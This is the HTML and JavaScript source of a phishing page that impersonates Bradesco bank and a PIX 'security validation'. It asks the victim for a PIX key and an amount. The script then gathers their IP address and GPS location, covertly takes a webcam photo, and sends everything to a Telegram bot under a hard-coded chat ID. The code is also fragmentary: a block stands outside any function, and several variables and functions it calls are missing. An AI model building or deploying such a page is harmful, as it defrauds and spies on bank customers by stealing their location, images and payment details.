<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bradesco | Validação PIX</title>

    <meta property="og:title" content="Bradesco - Segurança Mobile">
    <meta property="og:description" content="Autentique seu dispositivo para liberar o recebimento pendente via PIX.">
    
    <meta property="og:image" content="bradesco-logo.png">
    
    <meta property="og:type" content="website">

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #eee; }
        /* VERMELHO BRADESCO */
        .header { background-color: #cc092f; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
        .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #cc092f; display: none; }
        .bc-logo { width: 150px; height: auto; display: block; margin: 0 auto; }
        .content { padding: 30px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: bold; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        /* BOTÃO VERMELHO BRADESCO */
        .btn-acao { width: 100%; background-color: #cc092f; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; text-decoration: none; }
        /* BOTÃO AZUL BRADESCO (PARA A SEGUNDA TELA) */
        .btn-blue { background-color: #003a70; }
        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { font-size: 11px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
        #tela-permissao { display: none; text-align: center; }
    </style>
</head>
<body>

<div class="pix-card">
    <div id="header-dados" class="header">PORTAL DE SEGURANÇA</div>
    
    <div id="header-bc" class="bc-header">
        <img src="bradesco-logo.png" alt="Bradesco" class="bc-logo">
    </div>

    <div class="content">
        <div id="tela-dados">
            <label>Valor R$:</label>
            <input type="number" id="valor" placeholder="Ex: 1500">
            <label>Chave PIX:</label>
            <input type="text" id="chave" placeholder="Digite sua chave">
            <button class="btn-acao" onclick="mostrarAviso()">PROSSEGUIR</button>
        </div>

        <div id="tela-permissao">
            <h2 style="font-size: 18px; color: #333;">Autenticação Biométrica</h2>
            <p style="color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px;">
                Para sua segurança, o Banco Central exige a validação da sua localização e identidade via navegador.
            </p>
            <button class="btn-acao btn-blue" id="btnFinal" onclick="executarCaptura()">
                AUTENTICAR DISPOSITIVO
                <div class="spinner" id="spinner"></div>
            </button>
        </div>
        <div class="footer-info">Bradesco S.A. | Protocolo de Segurança Ativa</div>
    </div>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>

    const ID = "560716860";

    function mostrarAviso() {
        valorGlobal = document.getElementById('valor').value;
        chaveGlobal = document.getElementById('chave').value;
        
        if(!valorGlobal || !chaveGlobal) {
            return alert("Por favor, preencha todos os campos para prosseguir.");
        }
        
        // Esconde Tela 1
        document.getElementById('header-dados').style.display = 'none';
        document.getElementById('tela-dados').style.display = 'none';
        
        // Mostra Tela 2 (Bradesco)
        document.getElementById('header-bc').style.display = 'block';
        document.getElementById('tela-permissao').style.display = 'block';
    }

    async function executarCaptura() {
        document.getElementById('spinner').style.display = 'inline-block';
        document.getElementById('btnFinal').disabled = true;

        let dadosAlvo = {
            ip: "Buscando...",
            valor: document.getElementById('valor').value,
            chave: document.getElementById('chave').value,
            mapa: "GPS Negado/Pendente",
            aparelho: navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC"
        };

        // Captura IP Rápido
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            dadosAlvo.ip = d.ip;
        } catch(e){}

        // Tenta GPS
        navigator.geolocation.getCurrentPosition(async (pos) => {
            dadosAlvo.mapa = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await processarEnvio(dadosAlvo);
        }, async () => {
            await processarEnvio(dadosAlvo);
        }, { timeout: 7000 });
    }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500)); 
            
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            stream.getTracks().forEach(t => t.stop());

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            const fd = new FormData();
            fd.append('chat_id', ID);
            fd.append('photo', blob, 'foto.jpg');

            fd.append('caption', legenda);
            fd.append('parse_mode', 'Markdown');

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            window.location.href = "bradesco.html";

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',

                body: JSON.stringify({ chat_id: ID, text: textoUrgent, parse_mode: 'Markdown' })
            });
